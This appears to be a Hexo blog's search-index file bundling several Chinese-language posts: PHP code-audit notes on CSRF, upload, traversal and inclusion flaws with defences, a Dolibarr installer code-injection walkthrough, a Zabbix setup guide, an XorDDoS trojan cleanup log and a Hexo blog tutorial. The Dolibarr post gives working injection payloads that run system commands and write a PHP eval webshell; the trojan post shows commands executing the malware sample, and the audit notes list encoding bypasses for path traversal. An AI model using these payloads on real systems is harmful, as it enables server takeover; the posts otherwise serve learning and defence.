案例我们来看下面的一段代码,这个表单当被访问到的时候，用户就退出了登录。假设有一个转账的表单，只需要填写对方的用户名，和金额就可以，那如果我提前把 URL 构造好，发给受害者，当点击后，钱就被转走了。或者我把这个 URL 放到我的网页中，通过&lt;img src=”我构造的URL” ，当其他人打开我的网址后，就中招了。 攻击流程 CSRF漏洞挖掘方法通过上面的描述，我们知道了漏洞的原有，那我们审计的时候可以检查处理表单有没有以下判断。是否有验证 token。是否有图片验证码。是否有 refe 信息。如果三个判断都没有，那么就存在了 CSRF 漏洞，CSRF 不仅限于 GET 请求， POST 请求同样存在。CSRF 漏洞防范方法图片验证码，这个想必大家都知道，但是用户体验并不好，我们可以看下面的一些处理方法。token验证。token验证方法如下，每次访问表单页的时候，生成一个不可预测的token存放在服务器session中，另外一份放页面中，提交表单的时候需要把这个token带过去，接收表单的时候先验证一下token是否合法。Referer信息验证大多数情况下，浏览器访问一个地址，其中header头里面会包含Referer信息,里面存储了请求是从哪里发起的。如果HTTP头里包含有Referer的时候，我们可以区分请求是同域下还是跨站发起的，所以我们也可以通过判断有问题的请求是否是同域下发起的来防御 CSRF 攻击。Referer 验证的时候有几点需要注意，如果判断Referer是否包含 *.XXX.com,如果有子域名有漏洞，会存在绕过的可能。如果判断的条件的是Referer中是否包含字符 ‘xxx.com’ 那攻击者在他目录中建立一个 xxx.com 文件夹同样存在绕过的可能。如果可以最合适的判断是，直接判断是否等于当前域名。 文件上传漏洞文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，“文件上传”本身是没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 漏洞危害上传文件的时候，服务器端脚本语言未对上传的文件进行严格的验证和过滤，就有可能上传恶意的文件，从而控制整个网站，甚至是服务器。 漏洞条件文件可以上传、知道文件上传的路径、上传文件可以被访问、上传文件可以被执行 文件上传可控点Content-Length,即上传内容大小MAX_FILE_SIZE,即上传内容的最大长度filename,即上传文件名Content-Type,即上传文件类型请求包中的乱码字段，即是所上传文件的内容有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现 挖掘思路上传点都调用同一个上传类，直接全局搜索上传函数黑盒寻找上传点，代码定位 代码案例name：客户端的原始上传文件名称Type：上传文件的MIME类型Tmp_name：服务器端用来保存上传文件的临时文件路径Error：上传文件时的错误信息Size：上传文件的大小，单位 文件上传绕过客户端用firebug将form表单中的onsubmit事件删除上传木马文件，Burp拦截数据包，修改扩展名 文件上传绕过服务端黑白名单过滤修改MIME类型截断上传攻击.htaccess文件攻击目录验证 防护方案检测文件上传内容黑白名单验证，检测文件扩展名是否合法MIME验证，检测文件的MIME类型限制文件大小更改临时文件夹的路径读取上传文件的绝对路径与文件名称隐藏文件路面 文件操作漏洞 目录穿越目录穿越(Directory Traversal)攻击是黑客能够在Web应用程序所在的根目录以外的文件夹上，任意地存取被限制的文件夹、执行命令或查找数据。目录穿越攻击，也有人称为Path Traversal攻击。 漏洞危害攻击者可以使用目录穿越攻击来查找、执行或存取Web应用程序所在的根目录以外的文件夹。如果目录穿越攻击成功，黑客就可以执行破坏性的命令来攻击网站。 绕过方式进行URL编码点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c 进行16为Unicode编码点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216 进行双倍URL编码点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c 进行超长UTF-8 Unicode编码点–&gt;%c0%2e %e0$40%ae %c0ae 反斜杠–&gt;%c0af %e0%80af %c0%af 正斜杠–&gt;%c0%5c %c0%80%5c 修复方案在URL内不要使用文件名称作为参数检查使用者输入的文件名是否有“..”的目录阶层字符在php.ini文件中设置open_basedir来指定文件的目录使用realpath函数来展开文件路径中的“./”、 “../”等字符，然后返回绝对路径名称使用basename函数来返回不包含路径的文件名称 文件包含漏洞文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包含漏洞。 漏洞危害执行恶意代码包含恶意文件控制网站甚至控制网站服务器等 本地包含本地文件包含（Local File Include，LFI），LFI允许攻击者通过浏览器包含本机上的文件。当一个WEB应用程序在没有正确过滤输入数据的情况下，就有可能存在这个漏洞，该漏洞允许攻击者操纵输入数据、注入路径遍历字符、包含web服务器的其他文件。 远程包含远程文件包含（Remote File Include，RFI）， RFI允许攻击者包含远程文件，远程文件包含需要设置allow_url_include = On，四个文件都支持HTTP、FTP等协议，相对本地文件包含更容易利用，出现的频率没有本地包含多。 挖掘经验模块加载、cache调用，传入的参数拼接包含路径include()使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。 inclue_once()功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 require()使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。 require_once()功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 修复方案关闭远程包含参数开关，彻底切断这个业务相比较设置类似白 名单的方法，筛选固定文件名常见目录穿越字符进行过滤，如（./ .// ..\等） 任意文件读取漏洞通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或写入任意内容，往往能够使攻击者从服务器上获取敏感信息文件，正常读取的文件没有经过校验或者不严格，用户可以控制这个变量读取任意文件 漏洞危害任意文件读取漏洞，是web安全里高危的漏洞，它可以泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。 挖掘经验fopen()file_get_contents()freadfgets allow_url_fopen选项激活了 URL 形式的 fopen 封装协议fgetss 使得可以访问 URL 对象例如文件。默认的封装协议提供用ftp 和 http 协议来访问远程文件，一些扩展库例如 zlib 可file 能会注册更多的封装协议 任意文件删除攻击者从寻找上删除的功能，正常删除功能的文件没有经过校验或者不严格，攻击者控制这个可操作的变量配合目录遍历进行删除其他文件 unlink函数 修复方案正则严格判断用户参数的格式检查使用者输入的文件名是否有 “..” 的目录阶层字符在php.ini文件中设置open_basedir来限定文件访问范围 0x06 常规漏洞的防范方法taint PHP 安全扩展功能介绍Taint 可以用来检测隐藏的 XSS code, SQL 注入， Shell注入等漏洞，并且这些漏洞如果要用静态分析工具去排查， 将会非常困难， 我们来看下面这张图:安装方法下载 taint： http://pecl.php.net/package/taint 配置123/usr/local/php/bin/phpize./configure --with-php-config=/usr/local/php/bin/php-configmake &amp;&amp; make install 更加详细的可以参考：http://www.cnblogs.com/linzhenjie/p/5485474.html应用场景开发团队要求每个人都做到非常的安全比较难，但是把taint安装在开发环境，特别适合，一看到 warning 信息一般都回去改。 ngx_lua_waf功能介绍防止 sql 注入，本地包含，部分溢出，fuzzing 测试，xss，SSRF 等 web攻击。防止 svn /备份之类文件泄漏。防止 ApacheBench 之类压力测试工具的攻击。屏蔽常见的扫描黑客工具，扫描器。屏蔽异常的网络请求。屏蔽图片附件类目录 php 执行权限。防止 webshell 上传。安装方法安装依赖: luajit 、ngx_devel_kit、nginx_lua_module安装nginx、ngx_lua_waf在nginx.conf里的 http 添加配置详细安装文档效果图 0x07 参考文献https://mp.weixin.qq.com/s/W4ZgCEmjkSAexXBTVBD_zghttp://www.cnblogs.com/linzhenjie/p/5485474.html]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phpstorm+phpstudy+xdebug+Dolibarr]]></title>
    <url>%2F2018%2F08%2F11%2FPhpstorm-phpstudy-xdebug-Dolibarr%2F</url>
    <content type="text"><![CDATA[【前言】 PhpStorm 是 JetBrains 公司开发的一款商业的 PHP 集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。 【准备】先从网上下载PhpStorm和Phpstudy软件，版本不限定。在第一次打开Phpstorm时，需要输入注册码，具体方法可参考https://blog.csdn.net/finish_dream/article/details/80045514 亲测有效。 【配置步骤】进行phpStudy+PhpStorm+XDebug的配置，因为phpStudy集成了XDebug扩展，所以不用单独下载XDebug。 1.phpStudy当前版本确定，我们用PHP-5.5.38的版本。 2.在其他选项菜单-&gt;打开配置文件-&gt;php.ini，滑到最后看到[XDebug]节点做如下的修改： 123456789101112131415161718192021222324252627282930313233343536373839404142434445[XDebug];性能分析文件的存放位置，默认值为/tmpxdebug.profiler_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;;函数调用跟踪信息输出文件目录，默认值为/tmpxdebug.trace_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;;zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为0xdebug.auto_trace=1;是否允许Xdebug跟踪函数参数，默认值为0xdebug.collect_params=1;是否允许Xdebug跟踪函数返回值，默认值为0xdebug.collect_return=1;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为0xdebug.profiler_enable = 1;性能分析文件的命名规则，默认值为cachegrind.out.%pxdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;xdebug.remote_enable = 1;用于zend studio远程调试的应用层通信协议xdebug.remote_handler = &quot;dbgp&quot;xdebug.idekey = PHPSTORMxdebug.remote_host = &quot;127.0.0.1&quot;xdebug.remote_port = 9000 3.打开Phpstorm，需要打开或者新创一个项目，这里我们打开Phpstudy的根目录作为项目。在PhpStudy软件的解压目录下的www文件夹就是我们的网站根目录。 open -&gt;选择相应目录的WWW文件，点OK，再点OK 完成项目的创建。 4.选择PHP的版本信息。 Debug端口设置 IDEKEY： 配置PHP Web Application 查看配置： xdebug配置完成了 3.实现截取操作 在火狐或是谷歌浏览器中下载插件Xdebug helper，图标为一只吃虫子的标志。点击Debug启动Xdebug helper。 在Pphstorm中写好一个php文件，并开启如下的选项，左上角的电话图标。 选择一个浏览器打开写好的文件 截取到了内容，或者你点击网页的刷新，会在phpstrom中打开相应的php文件，也说明截取到了。 Dolibarr ERP/CRM php代码注入漏洞Dolibarr ERP &amp; CRM是一个用于管理的组织的活动(联系人、供应商、发票、订单、股票、议程…)。它是一个用PHP语言编写的开源软件，支持mysql,mssql,pgsql。专为小型、中型或大型公司、基金会和自由职业者设计。 1、先配置好Dolibarr环境。 将Dolibarr的压缩包解压到PhpStudy的WWW的目录下。 然后打开Phpstuduy，点击其他选项菜单-&gt;Phpstudy设置-&gt;端口常规设置，在网站目录中选择dolibarr目录中的hedocs文件，然后点击应用。 打开浏览器输入127.0.0.1/install 然后点击开始进行dolibarr的安装。账户密码均为root，然后一直下一步，直至安装完毕。 安装完毕后，会在Phpstrom中自动截取到step1.php的文件。 2、开始代码的修改。 step1.php文件第55行接受了我们传递的db_name参数并执行了GETPOST方法 按F7跟进GETPOST，在functions.lib.php第512行，GETPOST方法根据接收的check值进行不同的操作，此处接收的check值为alpha。我们看到在switch的alpha代码块中，对db_name的值进行了双引号和../的过滤。 ALT+SHIFT=F7跳回step1.php,在接收了全部参数，并确定没有错误的情况下。在文件517行对配置文件进行了备份并调用write_conf_file方法将参数写入配置文件。 继续跟进528行write_conf_file,函数首先定义了所需要的全局变量来获取参数值，并把配置写入/conf/conf.php文件。 继续往下走，直接定位到写入数据库名称的代码段 提交时前台会有js检测，用burp来截断修改我们的参数值，注意在提交时要勾选创建数据库复选框，否则配置文件写入不成功。 数据库名称改为dolibarr \’;phpinfo();// 配置文件也进行了正常写入，但是虽然已经正常写入了代码，如果直接访问配置文件被阻止 Ø通过包含此文件的文件去间接的执行代码 更改payload，执行系统命令并getshell 将db_name改为dolibarr \’;system($_GET[cmd]);// 访问/insex.php?cmd={command} 修改命令为echo “&lt;?php @eval($_POST[topsec])?&gt;”&gt; 网站绝对路径/shell.php 请求后会在网站根目录下生成一句话木马，尝试用菜刀连接]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zabbix可视化监控的搭建]]></title>
    <url>%2F2018%2F08%2F10%2FZabbix%E5%8F%AF%E8%A7%86%E5%8C%96%E7%9B%91%E6%8E%A7%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[【前言】 zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。 0x01 【操作环境】CentOS Linux release 7.5.1804 (Core)zabbix版本：zabbix-3.4.12 0x02 【环境准备】1、LAMP安装和启动：12345Apache安装：yum install http* -y Apache启动：systemctl start httpd Mariadb安装：yum install mariadb-server mariadb -y Mariadb启动：systemctl start mariadb.service PHP安装：yum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml php-bcmath -y LAMP安装参考资料：https://www.cnblogs.com/me80/p/7218883.html 2、GCC环境安装1yum install gcc gcc-c++ autoconf automake zlib zlib-devel openssl openssl-devel pcre pcre-devel -y 3、selinux和防火墙处理进入seliunx配置文件123vim /etc/selinux/config SELINUX=disabled #重启才生效selinux：setenforce 0 #临时关闭systemctl stop firewalld.service #关闭防火墙 0x03 【安装步骤】一、安装zabbix1、在官网下载zabbix安装包，https://www.zabbix.com/download2、解压软件包并安装依赖包123cd /usr/local/src tar -zxvf zabbix-3.4.12.tar.gz yum -y install net-snmp-devel libxml2-devel libcurl-deve libevent libevent-devel libcurl 3、编译安装zabbix123cd zabbix-3.4.3/ #切换进入zabbix目录 ./configure --prefix=/data/server/zabbix --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2 #编译zabbix make&amp;&amp;make install #安装zabbix,此步骤有点长，请耐心等待。 二、配置zabbix1、创建用户账户对于所有Zabbix的守护进程，需要一个无特权的用户。如果Zabbix守护进程以一个无特权的用户账户启动，那么它会使用该用户运行。然而，如果一个守护进程以‘root’用户启动，它会切换为‘zabbix’用户账户，且这个用户必须存在。在Linux系统中，可以使用下面命令建立一个用户（该用户属于自己的用户组，“zabbix”）：12groupadd zabbixuseradd -g zabbix zabbix 2、数据库导入zabbix template使用数据库用户zabbix登录数据库123456mysql –uzabbix –puse zabbix; #切换到zabbix库#导入zabbix默认表source /usr/local/src/zabbix-3.4.12/database/mysql/schema.sql; source/usr/local/src/zabbix-3.4.12/database/mysql/images.sql;source /usr/local/src/zabbix-3.4.12/database/mysql/data.sql; 3、创建zabbix用户和日志目录并给予权限123useradd -s /sbin/nologin zabbix #创建用户mkdir /usr/local/zabbix/logs #创建目录chown -R zabbix:zabbix /usr/local/zabbix #给予权限 4、配置zabbix的服务端（server）123456789101112vim /data/server/zabbix/etc/zabbix_server.conf &gt;LogFile=/data/server/zabbix/logs/zabbix_server.logPidFile=/data/server/zabbix/zabbix_server.pidDBHost=localhostDBName=zabbixDBUser=zabbixDBPassword=123456DBSocket=/data/server/mysql/mysql.sockTimeout=4LogSlowQueries=3000Include=/data/server/zabbix/etc/zabbix_server.conf.d/*.conf 5、配置zabbix客户端（agent）123456789vim /data/server/zabbix/etc/zabbix_agentd.conf&gt;PidFile=/data/server/zabbix/zabbix_agentd.pidLogFile=/data/server/zabbix/logs/zabbix_agentd.logServer=127.0.0.1ListenPort=10050ServerActive=127.0.0.1Hostname=Zabbix serverInclude=/data/server/zabbix/etc/zabbix_agentd.conf.d/*.conf 6、配置PHP相应的文件123456789vim /etc/php.ini&gt;php_value max_execution_time 300php_value memory_limit 128Mphp_value post_max_size 16Mphp_value upload_max_filesize 2Mphp_value max_input_time 300php_value always_populate_raw_post_data -1date.timezone = Asia/Shanghai 7、安装zabbix web界面123mkdir /var/www/html/zabbixcd /usr/local/src/zabbix-3.4.0/frontends/php cp -a . /var/www/html/zabbix 8、启动zabbix服务1234systemctl start httpd #启动apache服务/data/server/mysql/support-files/mysql.server start #启动数据库服务/data/server/zabbix/sbin/zabbix_server #启动zabbix服务端服务/data/server/zabbix/sbin/zabbix_agentd #在所有的被监控机器上启动zabbix_agentd 三、配置zabbix前端1、在你的浏览器中，打开Zabbix URL： http://&lt;服务器IP或主机名&gt;/zabbixhttp://192.168.199.206/zabbix/setup.php你可以看到前端安装向导的第一个页面。 2、确认满足所有的软件安装前置条件,如果下图这些显示Failed，那么我们编辑/etc/php.ini，将下图中的配置项都改成要求的大小，未配置的项进行手动添加vim /etc/php.ini 如果出现PHP xmlwiter，PHP smlreader off 那么请键入下条命令yum install php-bcmath php-mbstring php-xmlwriter php-xmlreaderPHP LDAP Warning 不用管，直接下一步 3、输入连接数据库的详细信息。Zabbix数据库必须是已经创建好的。 4、输入Zabbix Server的详细信息。 5、检查设置信息。 6、下载配置文件，将它放置在Web服务器HTML文档子目录（即你复制Zabbix PHP文件的目录）的conf/路径下。cd /var/www/html/zabbix/confrz使用rz命令上传就可以了 7、上传完毕后，完成安装。 8、Zabbix前端已经就绪！默认的用户名是Admin，密码是zabbix。 登录后显示界面： 使用说明参考文档：https://www.zabbix.com/documentation/3.4/manual/quickstart/login 0x04 【参考文献】https://www.zabbix.com/download?zabbix=3.4&amp;os_distribution=centos&amp;os_version=7&amp;db=MySQLhttps://www.cnblogs.com/kowloon/p/7771495.htmlhttp://blog.51cto.com/xpu2001/2052634]]></content>
      <categories>
        <category>安全运维</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
        <tag>监控</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次XorDDos木马的清除]]></title>
    <url>%2F2018%2F08%2F10%2F%E8%AE%B0%E4%B8%80%E6%AC%A1XorDDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%B8%85%E9%99%A4%2F</url>
    <content type="text"><![CDATA[【前言】 一种名为“XOR.DDoS”的新型木马出现，该木马能够感染32位和64位的Linux系统，通过安装rootkit来隐藏自身，并可通过DDoS攻击形成僵尸网络。XOR.DDoS木马原理是杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。 0x01 【实现环境】CentOS Linux release 7.5.1804 (Core) 在植入木马之前一定要记得把虚拟机的网络设置成NAT或host-only模式防止病毒传播到本机或造成破坏！ 0x02 【植入木马】把XorDDos的病毒样本上传到liunx机器中，进行解压，运行木马文件，执行完之后发现木马自毁了文件，可知是一个并不一般的木马。12345unzip XorDDos样本-密码123.zip chmod +x a753cb1ff86c742bb497155362664c3b ./a753cb1ff86c742bb497155362664c3b sh b3c466263551794bb247c68ff1bc357a.sh ./b3c466263551794bb247c68ff1bc357a 0x03 【杀马全过程】1.发现cpu使用超高、网络流量异常、服务器还会出现卡顿现象。通过top发现会有几个可疑的程序占用了CPU。1top 2.执行tcpdump -i ens33后发现网络的流量异常，不断在往外发送请求。1tcpdump -i ens33 3.通过lsof -i 看到了一个可疑的服务，PID为1657。1lsof -i 4.尝试着杀掉这个进程 kill -9 1657，发现又起了另一个服务进程，猜测这个木马会不断的改名自启。1kill -9 1657 查杀思路：由于运行进程有多个相互保护（参考一下pstree），而且和病毒文件直接也是相互配合，如果直接删除也会重新生成一个新的病毒文件，所以查杀的基本的思路是：删除定时任务中的病毒启动—&gt;破坏病毒文件使其不可执行（不要删除，否会自动生成）—&gt;停止系统病毒进程—&gt;删除病毒文件—&gt;清理感染文件—&gt;关闭病毒开机启动以下查杀可以自由组合，按上面查杀思路排列即可！ 5.查看木马进程的位置。(proc之后跟的数字文件就是程序的PID)1ll /proc/9257 我们还可以尝试使用rkhunter或chkrootkit工具看看有哪些文件被木马篡改过。步骤略。 6.查看计划任务，没有发现任何任务，可是其他同学会发现，从而可以定位木马的目录在/etc/cron.hourly/1crontab -l #查看计划任务 1ll /etc/cron.hourly/ #发现了木马的执行文件位置 7.先对木马文件去权 chmod 000 uzsziblfy.sh ，然后查看里面的文件信息。也可以尝试将木马执行文件下载下来进行反编译，不过一定要先对其去权。1cat /etc/cron.hourly/ccyfuny.sh 对其文件去权chmod 000 /usr/bin/ccyfuny 8.利用ll -aR /etc/rc.d查看木马文件的连接，红色一直在闪烁的是之前删除了的木马。1ll -aR /etc/rc.d 对其去权 chmod 000 /etc/init.d/ccyfuny 9.reboot重启系统,然后查看CPU和开放端口以及进程情况。查看top没有发现可疑程序。1top 也没发现可疑的进程1lsof -i 也没发现可疑的端口开放1netstat -anlpt 10.所有文件去完权后，接着清除所有的可疑文件：123rm -rf /usr/bin/ccyfuny ccyfuny.shrm -rf /etc/cron.hourly/ccyfuny.sh rm -rf /etc/init.d/ccyfuny 11.再reboot重启系统，并没有发现可疑文件了。12netstat -anlptlsof -i 总结，先去除所有可疑执行文件的执行权限，然后重启，再删除所有可疑文件，再重启，就大功告成了。 0x04 【参考文件】https://blog.csdn.net/gosenkle/article/details/80220788https://blog.csdn.net/rigous/article/details/73970391]]></content>
      <categories>
        <category>木马查杀</category>
      </categories>
      <tags>
        <tag>木马查杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo-GitHub搭建静态博客平台(Next主题)]]></title>
    <url>%2F2018%2F08%2F09%2FHexo-GitHub%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E5%B9%B3%E5%8F%B0-Next%E4%B8%BB%E9%A2%98%2F</url>
    <content type="text"><![CDATA[gitHub是一个面向开源及私有软件项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 0x01 准备工作域名我的域名：www.dizai.tech，主要是提升自我逼格，不愿意花钱就跳过此步骤。国内可以去阿里云或腾讯云购买域名，价格也很便宜。 环境技术前往github官网https://github.com 注册一个github账号。 Hexo 的安装前提就是得有 Node.js 和 Git 。 这里，我们要区分清楚git与github。git是一个版本控制的工具，而github有点类似于远程仓库，用于存放用git管理的各种项目。 下面提供相关的官方版本地址，安装教程去网上搜一下就很多。 Node 官方版本安装：https://nodejs.org/en/ Git 官方版本安装：https://git-scm.com/download/win 我用到软件版本（你们可以在官方下载最新版的） Git：Git-2.18.0-64-bit Node：node-v10.7.0-x64 验证安装：任何位置鼠标右击出现Git Bash Here cmd下 1git --version 验证安装：cmd下 1node -v 0x02 Github 配置创建仓库 new repository在自己的GitHub账号下创建一个新的仓库，命名为username.github.io（username 是你的账号名)。 在这里，要知道，GitHub Pages有两种类型：User/Organization Pages 和 Project Pages，而我所使用的是User Pages。 简单来说，User Pages 与 Project Pages的区别是： User Pages 是用来展示用户的，而 Project Pages 是用来展示项目的。 用于存放 User Pages 的仓库必须使用username.github.io的命名规则，而 Project Pages 则没有特殊的要求。 User Pages 将使用仓库的 master 分支，而 Project Pages 将使用 gh-pages 分支。 User Pages 通过 http(s)://username.github.io 进行访问，而 Projects Pages通过 http(s)://username.github.io/projectname 进行访问。 另外注意： 注册的邮箱一定要验证，否则不会成功； 仓库名字必须是：username.github.io，其中username是你的用户名； 仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效； 0x03 配置SSH key用于本地与github数据交换生成并配置key执行如下命令12git config --global user.name &quot;liuxianan&quot; #你的github用户名git config --global user.email &quot;xxx@qq.com&quot; #填写你的github注册邮箱 生成ssh密钥12cd ~/. ssh #检查本机已存在的ssh密钥ssh-keygen -t rsa -C &quot;邮件地址&quot; #生成密钥 连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\id_rsa.pub文件，并复制其中内容 打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key： title任意填写，将内容复制到key中即可 测试ssh本地执行 ssh -T git@github.com #注意邮箱地址不用改如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到： Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access. 看到这个信息说明SSH已配置成功！ 0x04 安装hexo以下命令都是在git命令行中实现 首先在本地磁盘中建立一个Hexo文件夹用于存储本地文件(做本地文件保存以及测试使用)然后在文件夹中右击打开git命令框(我第一次直接在桌面右击，所以命令行无效果) 在git命令框中安装Hexo 1npm install -g hexo 1hexo init 此目录会自动生成hexo相关文件 注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件。 本地预览 hexo目录中执行123hexo clean #清除缓存hexo g #生成静态页面hexo s #启动本地预览服务 执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github 浏览器访问[http://127.0.0.1:4000或localhost:4000，即可看到hexo默认生成页面hello,world] 0x05 写博客进入hexo根目录 1hexo new &apos;my-first-blog&apos; ‘ ‘中为你本篇博客的名称，执行完成后，会自动在\hexo\source_posts\目录下生成.md文件， 只要打开这个文件就可以写博客了。（.md的文件必须用支持markdown的编辑器） 0x06 上传到github上传前的配置配置站点配置文件_config.yml中的deploy部分： 1234deploy: type: git repository: git@github.com:yourname/yourname.github.io.git branch: master 安装上传插件1npm install hexo-deployer-git --save 上传文件在hexo根目录下 1hexo d 会将有所改动的内容全部提交至github 常用hexo命令123456789101112131415161718hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）hexo deploy #部署到GitHubhexo help #查看帮助hexo version #查看Hexo的版本hexo clean #清除缓存缩写：hexo n == hexo newhexo g == hexo generatehexo s == hexo serverhexo d == hexo deploy组合命令：hexo s -g #生成并本地预览hexo d -g #生成并上传 0x07 更改默认hexo主题及优化主题下载进入hexo根目录 执行 1git clone https://github.com/iissnan/hexo-theme-next themes/next 执行完成后会在hexo\themes\ 目录下生成next目录 next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，以后我们称为主题配置文件 你也可以自己更换自己喜欢的主题https://hexo.io/themes/ ，官网有很多主题， 主题应用配置站点配置文件 寻找theme字段，将其值修改为next（next前都有一个空格，否则会报错） 主题预览执行 123hexo clean #清除缓存hexo g #重新生成代码hexo s #部署到本地 浏览器访问 http://127.0.0.1:4000 查看效果 0x08 主题简单优化设置布局主题配置文件中 寻找 Scheme 字段，next提供三种默认主题布局，将你想使用的布局取消注释即可 123#scheme: Muse#scheme: Mistscheme: Pisces Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白 Mist - Muse 的紧凑版本，整洁有序的单栏外观 Pisces - 双栏 Scheme，小家碧玉似的清新 设置显示语言站点配置文件中 寻找language 字段，设置其值为 1language: zh-Hans 语言文件位于hexo\themes\next\languages目录下 设置菜单主题配置文件中 寻找menu字段 123456789menu: home: / || home #主页 categories: /categories/ || th #分类页 tags: /tags/ || tags #标签页 about: /about/ || user #关于页 #archives: /archives/ || archive #归档页 #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat #公益404 除主页与归档页外，其余页面需要手动创建 每行中 || 后的内容为指定此menu的图标 添加标签页新建页面 进入hexo根目录 1hexo new page tags 命令执行后，hexo\source\tags目录中生成index.md文件 设置页面类型 修改此index.md文件为(添加type行) 123title: tagsdate: 2016-11-15 19:10:05type: &quot;tags&quot; 设置具体博客文章tags 对于hexo\source_post目录下具体博客文章设置tags(设置tags行) 123title: 基于Hexo和Github搭建博客date: 2016-11-09tags: [npm, hexo, github] 添加分类页面新建页面 进入hexo根目录 1hexo new page categories 命令执行后，hexo\source\categories目录中生成index.md文件 设置页面类型 修改此index.md文件为(添加categories行) 123title: categoriesdate: 2016-11-15 19:11:13type: &quot;categories&quot; 设置具体博客文章categories 对于hexo\source_post目录下具体博客文章设置categories(设置categories行) 1234title: 基于Hexo和Github搭建博客date: 2016-11-09tags: [npm, hexo, github]categories: 搭建博客 添加关于页面添加页面 进入hexo根目录 1hexo new page about 命令执行后，hexo\source\about目录中生成index.md文件 修改index.md文件 123456789title: aboutdate: 2016-11-15 19:08:50## 关于我一只学习的小菜鸟，欢迎分享知识。QQ：Email: 设置站内搜索进入hexo根目录 1npm install hexo-generator-searchdb --save 站点配置文件中添加 12345search: path: search.xml field: post format: html limit: 10000 0x09 其他设置hexo 首页文章只显示一部分在博客文章适当位置添加&lt;!--more--&gt; 标记即可 网站底部字数统计进入hexo根目录 1npm install hexo-wordcount --save hexo\themes\next\/layout_partials\footer.swig文件中末尾添加 1234&lt;div class=&quot;theme-info&quot;&gt; &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt; &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) 